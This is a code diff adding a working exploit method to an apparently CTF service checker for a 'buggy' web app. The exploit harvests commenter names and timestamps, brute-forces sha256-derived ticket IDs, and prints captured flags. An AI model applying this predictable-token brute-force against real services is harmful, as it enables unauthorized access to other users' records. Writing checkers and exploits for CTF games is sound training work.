@@ -5,6 +5,12 @@ import string
 from enochecker import *
 from enochecker.utils import sha256ify
 
+# exploit
+import re
+from bs4 import BeautifulSoup as BS
+from datetime import datetime, timedelta
+from hashlib import sha256
+
 
 def random_string(amount):
     return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(amount))
@@ -106,9 +112,34 @@ class BuggyChecker(BaseChecker):
             raise BrokenServiceException("checker failed")
 
     def exploit(self) -> None:
-        pass
+        FLAG_RE = r"🏳️‍🌈\\X{4}"
+        u = []
+        for b in ["mega", "super"]:
+            r = self.http_get(route=f"/{b}-buggy")
+            s = BS(r.text, "html.parser")
+            c = s.find_all(class_="comment")
+            for x in c:
+                t = x.find(class_="cmnt-content")
+                a = x.find(class_="commenter")
+                u.append((a.h3.string, t.p.string))
+        username = random_string(20)
+        password = random_string(20)
+        response = self.http_post(route="/register", data={"username":username, "pw":password},
+                allow_redirects=False)
+        cookies = response.cookies
+        for x in u:
+            t = str(int((datetime.strptime(x[1], "%Y-%m-%d %H:%M:%S") + timedelta(hours=2)).timestamp()))
+            for i in range(int(t)-10, int(t)+10):
+                h = sha256()
+                h.update((x[0]+str(i)).encode())
+                h = h.hexdigest()
+                r = self.http_get(route=f"/tickets/{h}", cookies=cookies)
+                if "Ticket" in r.text or "buggy-team" in r.text:
+                    fl = re.findall(FLAG_RE, r.text)
+                    for f in fl:
+                        print(f)
 
 app = BuggyChecker.service
 
 if __name__ == "__main__":
-        run(BuggyChecker)
+    run(BuggyChecker)
